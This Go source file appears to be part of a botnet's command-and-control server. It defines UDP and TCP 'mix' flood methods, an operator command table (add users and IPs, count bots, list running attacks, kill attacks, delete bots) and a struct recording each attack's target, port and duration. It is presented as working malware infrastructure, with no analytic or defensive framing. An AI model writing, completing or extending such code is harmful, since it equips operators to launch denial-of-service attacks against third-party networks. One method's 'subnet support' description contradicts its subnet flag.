package cnc

import "sync"

type Attribute int

type CommandsInfo struct {
	Description string
	Name        string
	Uint8       []byte
	function    func(string, *Connection)
}

type MethodsInfo struct {
	Description string
	Name        string
	Subnet      bool // 1.1.1.1/24
	Layer       int
	Uint8       []byte
}

var MethodsList = map[int]MethodsInfo{
	0: {
		Description: "Udp with mixed packets (subnet support)",
		Name:        "!udpmix",
		Subnet:      false,
		Layer:       4,
		Uint8:       []byte{33, 117, 100, 112, 109, 105, 120},
	},
	1: {
		Description: "Tcp with mixed packets (subnet support)",
		Name:        "!tcpmix",
		Subnet:      true,
		Layer:       4,
		Uint8:       []byte{33, 116, 99, 112, 109, 105, 120},
	},
}

var CmdList = map[int]CommandsInfo{
	0: {
		Description: "Adds a new user to the database",
		Name:        "adduser",
		Uint8:       []byte{97, 100, 100, 117, 115, 101, 114},
		function:    Adduser,
	},
	1: {
		Description: "Bot count",
		Name:        "bots",
		Uint8:       []byte{98, 111, 116, 115},
		function:    Bots,
	},
	2: {
		Description: "Removes a user from the database",
		Name:        "removeuser",
		Uint8:       []byte{114, 101, 109, 111, 118, 101, 117, 115, 101, 114},
		function:    RemoveUser,
	},
	3: {
		Description: "Adds a new ip to the database",
		Name:        "addip",
		Uint8:       []byte{97, 100, 100, 105, 112},
		function:    AddIp,
	},
	4: {
		Description: "Removes ip from the database",
		Name:        "removeip",
		Uint8:       []byte{114, 101, 109, 111, 118, 101, 105, 112},
		function:    RemoveIp,
	},
	5: {
		Description: "List of botnet methods",
		Name:        "methods",
		Uint8:       []byte{109, 101, 116, 104, 111, 100, 115},
		function:    Methods,
	},
	6: {
		Description: "View active attacks",
		Name:        "running",
		Uint8:       []byte{114, 117, 110, 110, 105, 110, 103},
		function:    RunningCnc,
	},
	7: {
		Description: "Stop the attack",
		Name:        "kill",
		Uint8:       []byte{107, 105, 108, 108},
		function:    KillAttack,
	},
	8: {
		Description: "Delete bot",
		Name:        "delete",
		Uint8:       []byte{100, 101, 108, 101, 116, 101},
		function:    DeleteBot,
	},
}

type attackStruct struct {
	ch       chan int
	ID       int
	Duration int
	Finish   int
	Method   string
	Target   string
	Login    string
	Port     string
}

var AttackMap sync.Map
